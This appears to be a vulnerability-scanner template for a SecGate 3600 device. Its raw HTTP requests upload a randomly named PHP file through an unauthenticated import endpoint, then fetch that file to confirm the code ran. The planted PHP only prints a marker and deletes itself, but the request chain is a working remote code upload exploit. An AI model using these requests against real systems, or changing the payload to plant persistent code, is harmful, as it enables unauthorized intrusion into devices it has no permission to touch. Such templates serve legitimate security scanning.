id: SecGate-3600-sec_ssl-upload

info:
  name: SecGate-3600-sec_ssl-upload
  author: SecGate-3600-sec_ssl-upload
variables:
  filename: "{{to_lower(rand_text_alpha(8))}}"
  boundary: "{{to_lower(rand_base(20))}}"

http:
  - raw:
      - |
        POST /?g=sec_ssl_agent_import_save HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
        Content-Length: 354
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Cache-Control: max-age=0
        Connection: close
        Content-Type: multipart/form-data; boundary=----{{boundary}}
        Origin: null
        Upgrade-Insecure-Requests: 1
        SL-CE-SUID: 1057
        
        ------{{boundary}}
        Content-Disposition: form-data; name="reqfile"; filename="{{filename}}.php"
        Content-Type: text/plain
        
        <?php echo "testvuln"; unlink(__FILE__); ?>
        
        ------{{boundary}}
        Content-Disposition: form-data; name="submit_post"
        
        sec_ssl_agent_import_save
        ------{{boundary}}--

      - |+
        GET /attachements/{{filename}}.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
        Connection: close
        
    req-condition: true
    matchers:
      - type: dsl
        dsl:
          - "contains(body_2, 'testvuln')"
          - "status_code_1 == 302 && status_code_2 == 200"
        condition: and